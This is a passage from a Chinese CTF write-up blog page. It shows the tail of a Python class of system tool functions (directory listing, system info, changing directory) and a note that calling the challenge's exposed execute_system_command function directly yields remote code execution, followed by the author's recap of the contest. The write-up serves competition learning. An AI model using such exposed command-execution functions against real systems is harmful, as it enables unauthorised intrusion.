</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Path &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39; does not exist.&#34;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;&#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39; is not a directory.&#34;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">            <span class="n">items</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">items</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Directory &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39; is empty.&#34;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">            <span class="c1"># Format the output</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;Contents of &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39;:</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">full_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">full_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;[DIR]  </span><span class="si">{</span><span class="n">item</span><span class="si">}</span><span class="s2">/</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">full_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;[FILE] </span><span class="si">{</span><span class="n">item</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2"> bytes)</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error listing directory: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_system_info</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        Get basic system information.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: A string with system information.
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># Get platform information</span>
</span></span><span class="line"><span class="cl">            <span class="kn">import</span> <span class="nn">platform</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;System: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Node: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">node</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Release: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">release</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Version: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">version</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Machine: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">machine</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Processor: </span><span class="si">{</span><span class="n">platform</span><span class="o">.</span><span class="n">processor</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># Get memory information (Linux/Mac)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">()</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;Linux&#34;</span><span class="p">,</span> <span class="s2">&#34;Darwin&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/proc/meminfo&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">meminfo</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">meminfo</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;MemTotal:&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                                <span class="n">info</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Total Memory: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error getting system info: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_current_working_directory</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        Get the current working directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: The current working directory path.
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Current working directory: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error getting current directory: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">change_directory</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        Change the current working directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param path: The path to change to.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: A confirmation message or error.
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Changed directory to: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error changing directory: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个function的功能如下</p>
<blockquote>
<ul>
<li>execute_system_command: 执行系统命令（同步）</li>
<li>execute_system_command_async: 执行系统命令（异步）</li>
<li>list_directory_contents: 列出目录内容</li>
<li>get_system_info: 获取系统信息</li>
<li>get_current_working_directory: 获取当前工作目录</li>
<li>change_directory: 更改当前工作目录</li>
</ul></blockquote>
<p><code>execute_system_command &lt;命令&gt;</code>直接实现rce</p>
<h2 id="小结">小结
</h2><p>从机场下来就在打，差不多参与了四道题，最后亚军还有京东卡一张，爽歪歪。</p>
<p>事前李师傅和我说先冲个前五，我觉得我们没什么问题，但是肯定不是我C，是二进制那边，结果这次二进制太难了，所以就轮到我和web大手了😄</p>

            </section>

            <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ssti/">Ssti</a>
        
            <a href="/tags/go/">Go</a>
        
    </section>


    
	<section class="article-reward" style="margin: var(--card-padding) 0 0;display:block;text-transform:none;text-align:center;">
	  
		<h3 style="margin:0 0 .75rem 0; font-size:1.1rem;">赞赏支持</h3>
	  

	  <figure style="margin:0 auto;">
		
		  <img src="/wechat.png" alt="" loading="lazy"
			   style="width:min(260px, 90vw); height:auto;
					  border:1px solid #eee; border-radius:12px;
					  background:#fff; padding:6px;
					  box-shadow:0 2px 8px rgba(0,0,0,.04);">
		
		<figcaption style="font-size:.9rem; color:#666; margin-top:.5rem;"></figcaption>
	  </figure>
	</section>
	


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

            
        </article>

        

        

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/longjian-cup-finals-2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">陇剑杯决赛2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/vnctf2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">VNCTF2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/longjian-and-bay-area-cup-2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">陇剑杯2025以及湾区杯2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/iscc2025-regional-competition/">
        
        

        <div class="article-details">
            <h2 class="article-title">ISCC2025区域赛</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/actf2025-web-ak/">
        
        

        <div class="article-details">
            <h2 class="article-title">ACTF2025(webAK)</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>


        
            
        

        <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 baozongwi
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


        
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >
    

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.ad49ce61860e3b2f3ff245d0a7e122b6a9af199ebc14ddfd310fe5acb92c63dc.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
